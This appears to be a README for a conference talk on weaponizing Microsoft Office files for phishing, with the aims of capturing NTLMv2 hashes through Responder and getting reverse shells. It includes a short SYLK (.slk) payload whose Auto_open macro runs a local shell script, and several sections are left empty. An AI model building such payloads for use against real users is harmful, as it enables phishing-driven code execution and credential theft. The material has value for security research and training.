# Weaponizing-Office

## Introduction:
I did a talk at [0xC0ffee](https://0xc0ffee.co.za), where I discussed different ways to weaponize microsoft office.
What was different about the talk, was that these methods have been discovered prior to 2017, and did not require a lot of user interaction to execute the payloads. These methods work great with phishing attacks.

I decided not to use a standard way to present my talk, so [@MTB_m00se](https://twitter.com/MTB_m00se) introduced me to terminal markdown where I found [patat](https://github.com/jaspervdj/patat)

I recently discovered a tool called [Responder[(https://github.com/SpiderLabs/Responder), which I used in my talk.
I mainly used Responder to capture NTLMv2 hashes from victom machines.

I found a great [article](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4) explaining what is NTLMv2 hashes and what can be done with it.

Below is a short extract from the article:
> This is the way passwords are stored on modern Windows systems, and can be obtained by dumping the SAM database, or using Mimikatz. They are also stored on domain controllers in the NTDS file. These are the hashes you can use to pass-the-hash.

## Contents:
1. Excel (.SLK)
2. Outlook (file://)
3. Word (frameset)

Objective is to capture NTLMv2 hashes by using the above programs. The user should not have to do more than 1 click after downloading the office file. 

```BONUS: will try to get reverse shells as well```

## 1. Excel (.SLK)

> An SLK file is a file saved in the Symbolic Link (SYLK) format created by Microsoft to transfer data between spreadsheet programs and other databases. 

I found this exploit on [ired.team](https://ired.team/offensive-security/phishing-with-ms-office/phishing-.slk-excel) which gave a great walkthrough oh how to exactact perform RCE in an SLK file.

### Excel RCE

#### Setup
1. Create an new text file, put the the below code and save it as .slk file:
`
ID;P
O;E
NN;NAuto_open;ER101C1;KOut Flank;F
C;X1;Y101;K0;EEXEC("c:\shell.cmd")
C;X1;Y102;K0;EHALT()
E
`

2.
3.

#### CApture NTLMv2 Hash




### Excel RCE - Powershell Reverse shell
![](excel_NTLMv2_hash_capture.gif)


More on [Symbolic Link](https://en.wikipedia.org/wiki/SYmbolic_LinK_(SYLK)) files
